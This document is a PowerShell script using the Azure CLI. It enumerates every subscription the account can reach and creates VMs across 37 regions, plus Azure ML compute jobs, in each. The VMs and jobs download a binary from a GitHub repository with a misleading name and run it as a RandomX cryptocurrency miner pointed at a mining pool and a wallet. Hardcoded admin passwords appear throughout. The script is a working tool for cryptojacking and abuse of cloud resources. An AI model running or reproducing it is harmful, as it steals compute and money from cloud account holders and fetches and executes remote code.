Invoke-WebRequest -Uri https://raw.githubusercontent.com/trangtrau/random-agent-spoofer/master/zep.txt -OutFile van.txt
$checksup = az account list --query "[].id" -o tsv		
$listsup = @($checksup )		
foreach ($idsup in $listsup)		
{		
az account set --subscription $idsup		
az group create --name Anvu --location EastUs
$list="eastus","eastus2","westus","centralus","northcentralus","southcentralus","northeurope","westeurope","eastasia","southeastasia","japaneast","japanwest","australiaeast","australiasoutheast","australiacentral","brazilsouth","southindia","centralindia","westindia","canadacentral","canadaeast","westus2","westcentralus","uksouth","ukwest","koreacentral","koreasouth","francecentral","southafricanorth","uaenorth","switzerlandnorth","germanywestcentral","norwayeast","jioindiawest","westus3","swedencentral","qatarcentral"
foreach ($local in $list)
{
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F8s_v2 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F2s_v2 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  
az vm create --resource-group Anvu --name ms1a$(Get-Random) --location $local --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:20.04.202204190  --size Standard_F2s_v2 --priority Spot  --max-price -1 --admin-username  adminuser --admin-password Kh@nh29101990  --custom-data van.txt --no-wait  

}
}

az extension add --name ml
az extension add --name azure-cli-ml
$checksup = az account list --query "[].id" -o tsv		
$listsup = @($checksup )		
foreach ($idsup in $listsup)		
{	

$group="ms1"
$workspace="ms1"

az group create --name $group --location eastus
az ml workspace create --resource-group $group --name $workspace

$list="eastus","eastus2","westus","centralus","northcentralus","southcentralus","northeurope","westeurope","eastasia","southeastasia","japaneast","japanwest","australiaeast","australiasoutheast","australiacentral","brazilsouth","southindia","centralindia","westindia","canadacentral","canadaeast","westus2","westcentralus","uksouth","ukwest","koreacentral","koreasouth","francecentral","southafricanorth","uaenorth","switzerlandnorth","germanywestcentral","norwayeast","jioindiawest","westus3","swedencentral","qatarcentral"
$randomZones = $list | Get-Random -Count 7 | Select-Object -Unique


foreach ($local in $randomZones)
{
az ml computetarget create amlcompute -n $local --min-nodes 1 --max-nodes 1  -s Standard_DS3_v2 --location $local --resource-group $group --workspace-name $workspace --idle-seconds-before-scaledown 999999 --admin-username ubuntu --admin-user-password Avengerendgame123@ --no-wait
}

foreach ($local in $randomZones) {
    $computer = 'compute: azureml:' + $local
    $yamlFileName = "ms2_$local.yaml"
    New-Item -ItemType "File" -Path $yamlFileName
    Set-Content -Path $yamlFileName -Value '$schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json'
    Add-Content -Path $yamlFileName 'command: "wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar \nchmod 777 ar\n./ar -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p hung1 -a rx/0 -k -t 8 "'
    Add-Content -Path $yamlFileName 'environment:'
    Add-Content -Path $yamlFileName '  image: docker.io/python'
    Add-Content -Path $yamlFileName $computer
    az ml job create --file $yamlFileName --resource-group $group --workspace-name $workspace --name "ms1a$(Get-Random)"
}


}


